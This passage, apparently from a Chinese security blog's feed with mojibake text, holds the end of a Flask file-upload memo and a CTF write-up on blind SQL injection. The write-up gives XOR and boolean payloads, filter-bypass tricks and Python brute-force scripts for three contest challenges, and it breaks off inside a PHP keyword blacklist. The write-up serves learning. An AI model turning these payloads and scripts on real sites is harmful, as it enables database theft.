attr-equals">=</span>file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>Upload</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>send_from_directory<span class="token punctuation">,</span>render_template<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filenameUPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">r'E:\\flask\\upload\\'</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'txt'</span><span class="token punctuation">,</span> <span class="token string">'pdf'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">&#125;</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDERapp<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#åˆ¤æ–­ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å¦éæ³•</span>    <span class="token keyword">if</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token punctuation">:</span>        <span class="token keyword">return</span> filename    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'illegal file'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token comment"># check if the post request has the file part</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>             flash<span class="token punctuation">(</span><span class="token string">'No file part'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>          <span class="token comment"># if user does not select file, browser also</span>        <span class="token comment"># submit an empty part without filename</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'No selected file'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>              filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>            <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#saveæ–¹æ³•ä¿å­˜æ–‡ä»¶</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'uploaded_file'</span><span class="token punctuation">,</span>filename<span class="token operator">=</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/uploads/&lt;filename>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">uploaded_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>ä¸å¾—ä¸è¯´ï¼Œå®˜æ–¹çš„ä»£ç è¿˜æ˜¯è¦å¼ºä¸€äº›ï¼Œå½“ä¸Šä¼ ä¸ºç©ºæ—¶ä¼šæŠ¥é”™ï¼Œéæ³•æ–‡ä»¶ä¹Ÿä¼šæŠ¥é”™ï¼Œä½†ä¸Šä¼ æˆåŠŸåè·³è½¬åˆ°ä¸Šä¼ çš„æ–‡ä»¶urlå¤„</p><p> <code>UPLOAD_FOLDER</code> æ˜¯ä¸Šä¼ æ–‡ ä»¶è¦å‚¨å­˜çš„ç›®å½•ï¼Œ <code>ALLOWED_EXTENSIONS</code> æ˜¯å…è®¸ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•åçš„é›†åˆï¼Œ<code>MAX_CONTENT_LENGTH</code>æ˜¯é™åˆ¶çš„ä¸Šä¼ æ–‡ä»¶çš„å¤§å°</p><h2 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h2><ul><li><strong>Flask Mail</strong> - ä¸ºFlaskåº”ç”¨ç¨‹åºæä¾›SMTPæ¥å£</li><li><strong>Flask WTF</strong> - æ·»åŠ WTFormsçš„æ¸²æŸ“å’ŒéªŒè¯</li><li><strong>Flask SQLAlchemy</strong> - ä¸ºFlaskåº”ç”¨ç¨‹åºæ·»åŠ SQLAlchemyæ”¯æŒ</li><li><strong>Flask Sijax</strong> - Sijaxçš„æ¥å£ - Python/jQueryåº“ï¼Œä½¿AJAXæ˜“äºåœ¨Webåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨</li></ul><p>å‚è€ƒé“¾æ¥ï¼š</p><blockquote><p><a href="https://dormousehole.readthedocs.io/en/latest/index.html">https://dormousehole.readthedocs.io/en/latest/index.html</a>     ï¼ˆå®˜æ–¹æ–‡æ¡£ï¼‰</p><p><a href="https://www.w3cschool.cn/flask/">https://www.w3cschool.cn/flask/</a>   ï¼ˆW3Cschoolæ•™ç¨‹ï¼‰</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SQLæ³¨å…¥-æ— å›æ˜¾</title>
      <link href="posts/d991f96a/"/>
      <url>posts/d991f96a/</url>
      
        <content type="html"><![CDATA[<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><h3 id="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”Ezsqli"><a href="#2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”Ezsqli" class="headerlink" title="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”Ezsqli"></a>2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”Ezsqli</h3><p>å‡ºé¢˜æ€è·¯<a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">Smi1e</a></p><p>ç•Œé¢ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/tQegj4JmCsGbTXp.png" style="zoom:50%;" loading="lazy"><p>FUZZæµ‹è¯•åå‘ç°</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/7UIS3oMv6DWqsj8.png" style="zoom:80%;" loading="lazy"><p><code>in</code>è¢«è¿‡æ»¤<code>information_schema</code>ã€<code>mysql.innodb_table_stats</code>ã€<code>sys.schema_auto_increment_columns</code>éƒ½ç”¨ä¸äº†äº†ï¼Œè¿™æ—¶å°±éœ€è¦æ–°çš„è¡¨æ¥ä»£æ›¿ï¼Œ<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">å‚è€ƒ</a></p><p>Payload1ï¼š<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p><p>Payload2ï¼š<code>1^((select substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),1,1))=&#39;f&#39;)</code></p><p>äºæ˜¯å†™å‡ºç›²æ³¨çˆ†è¡¨è„šæœ¬ï¼ˆPayload1ï¼‰</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://586656b32259484e8dbc25a81ee0a407820801130961430a.changame.ichunqiu.com/index.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>        d <span class="token operator">=</span> <span class="token string">"1^(ascii(substr((select group_concat(table_name,'') from sys.x$schema_flattened_keys),&#123;&#125;,1))=&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>å¾—åˆ°ä¸¤ä¸ªè¡¨åï¼Œ<code>f1ag_1s_h3r3_hhhhh</code>ã€<code>users233333333333333</code></p><p><code>flag</code>åº”è¯¥åœ¨<code>f1ag_1s_h3r3_hhhhh</code>ä¸­ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªæŠ€å·§ï¼Œå°±æ˜¯å°†æŸ¥è¯¢è¯­å¥ä¸ç›¸åŒæ•°é‡çš„åˆ—è¿›è¡Œæ¯”è¾ƒï¼Œ<a href="https://nosec.org/home/detail/3830.html">å‚è€ƒ</a>ï¼Œå¦‚å›¾</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/sFLidjDgr5weSft.png" style="zoom: 80%;" loading="lazy"><p>è€Œåœ¨mysqlä¸­ï¼Œæ¯”è¾ƒå­—ç¬¦ä¸²å¤§å°æ˜¯æŒ‰ä½æ¯”è¾ƒçš„ï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨æ¯”è¾ƒå¤§å°çš„æ–¹æ³•ä¸€ä¸ªä¸€ä¸ªçš„å¾—åˆ°å­—æ®µçš„å†…å®¹</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/JIK9gluR1khN6zr.png" style="zoom:80%;" loading="lazy"><p>æ³¨ï¼šå‡ºé¢˜äººè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ï¼Œè¯¦è§é¢˜ç›®ä¸‹æ–¹çš„é“¾æ¥</p><p>mysqlé»˜è®¤æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„åŒºåˆ†å¤§å°å†™çš„æ³¨å…¥ï¼Œæ‰€ä»¥åœ¨çˆ†å­—æ®µçš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä½†ç”±äºæ¯”èµ›flagéƒ½æ˜¯å°å†™ï¼Œæ‰€ä»¥å°±ç›´æ¥ç›²æ³¨å°±å¯ä»¥äº†ï¼Œä½†è¿™é‡Œè¿˜æ˜¯ç»™å‡ºåŒºåˆ†å¤§å°å†™çš„æ–¹æ³•ï¼Œ<code>BINARY(&quot;A&quot;)</code>ã€<code>CAST(&quot;A&quot; AS JSON)</code>éƒ½ä¼šè¿”å›å¤§å†™çš„Aï¼Œå½“<code>in</code>è¢«è¿‡æ»¤äº†<code>BINARY</code>å°±ä¸å¥½ä½¿äº†ï¼Œæ‰€ä»¥ç”¨ç¬¬äºŒä¸ªå°±OK</p><p>è¿™é‡Œå¯ä»¥æµ‹è¯•å‡ºæœ‰ä¸¤ä¸ªåˆ—ï¼Œä½†æ˜¯ç›²çŒœç¬¬ä¸€åˆ—çš„ç¬¬ä¸€ä¸ªæ˜¯1å¯è¿˜è¡Œ</p><p>Payloadï¼š<code>1^((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))</code></p><p>äºæ˜¯å†™å‡ºç›²æ³¨çˆ†å­—æ®µè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://a9362c1023c04da19c143e01d7991148619db7d8fbff4e43.changame.ichunqiu.com/index.php"</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>        d <span class="token operator">=</span> <span class="token string">"1^((select 1,concat('&#123;&#125;~',CAST('0' AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    flag <span class="token operator">=</span> flag <span class="token operator">+</span> j</code></pre><p>æœ€ç»ˆå¯ä»¥å¾—åˆ°flag</p><h3 id="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><a href="#2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" class="headerlink" title="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"></a>2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</h3><p>é¦–å…ˆæœ‰ä¸ªç™»å½•ç•Œé¢</p><p>å°è¯•ä½¿ç”¨å¼±å¯†ç ï¼Œ<code>1&#39; or 1=1#</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/tuM3g2DS8hEQ1WL.png" alt loading="lazy"></p><p>äºæ˜¯å¯ä»¥åœ¨ç™»å½•ç•Œé¢è¿›è¡Œå¸ƒå°”ç›²æ³¨</p><p>çˆ†åº“Payloadï¼š<code>2&#39; or (select (mid((select database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>çˆ†è¡¨Payloadï¼š<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>çˆ†åˆ—Payloadï¼š<code>2&#39; or (select (mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;flag&#39;),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>çˆ†å­—æ®µPayloadï¼š<code>2&#39; or (select (mid((select group_concat(flaaag,&#39;&#39;) from flag),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://b191000b2d4c4a77ad9c86f2d5476e7172ed2000f40b4c72.changame.ichunqiu.com/"</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>        d <span class="token operator">=</span> <span class="token string">"(This is Payload)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        <span class="token comment">#print(d)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"lname"</span><span class="token punctuation">:</span>d <span class="token punctuation">,</span> <span class="token string">"lpass"</span><span class="token punctuation">:</span><span class="token string">'xxx'</span><span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'gbk'</span>        <span class="token keyword">if</span> <span class="token string">'æˆåŠŸ'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>r<span class="token punctuation">.</span>apparent_encoding<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>å¾—åˆ°æ•°æ®åº“ï¼š<code>nzhaopin</code>,è¡¨ï¼š<code>backup,flag,user</code>ï¼Œflagè¡¨çš„å†…å®¹ï¼š<code>id,flaaag</code>ï¼Œæœ€ç»ˆå¾—åˆ°flag</p><h3 id="CISCN2019-Web1â€”Hack-World"><a href="#CISCN2019-Web1â€”Hack-World" class="headerlink" title="CISCN2019-Web1â€”Hack World"></a>CISCN2019-Web1â€”Hack World</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“å¼‚æˆ–æ³¨å…¥ï¼Œç›²æ³¨çˆ†ç ´</p><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/t2nS8YpRmGTEsx7.png" alt loading="lazy"></p><p>é¢˜ç›®ç»™å‡ºäº†flagåœ¨flagè¡¨å’Œflagåˆ—ä¸­</p><p>æµ‹è¯•åå‘ç°è¿‡æ»¤äº†å¤§å¤šæ•°å­—ç¬¦ï¼Œä½†æœ‰äº›è¿˜æ˜¯æ²¡è¿‡æ»¤çš„ï¼Œäºæ˜¯è¿›è¡Œsqlç›²æ³¨</p><p>ç©ºæ ¼åˆ©ç”¨<code>()</code>ç»•è¿‡ï¼Œé…åˆå¼‚æˆ–æ³¨å…¥å’Œåˆ¤æ–­å›æ˜¾ä¿¡æ¯ä¸€ä¸ªä¸€ä¸ªçˆ†å‡ºå­—ç¬¦ä¸²</p><p>pythonè„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://13b50f67-3a54-481d-ae76-97f425fd8855.node3.buuoj.cn/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Error'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>ç½‘ä¸Šè¿™é¢˜çš„æºç ï¼Œå¯ä»¥å‚è€ƒå‚è€ƒ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">safe</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">#è¢«è¿‡æ»¤çš„å†…å®¹ å‡½æ•°åŸºæœ¬æ²¡è¿‡æ»¤</span>    <span class="token variable">$blackList</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'||'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'#'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'+'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'or'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'and'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'group'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'*'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'into'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load_file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'outfile'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blackList</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span 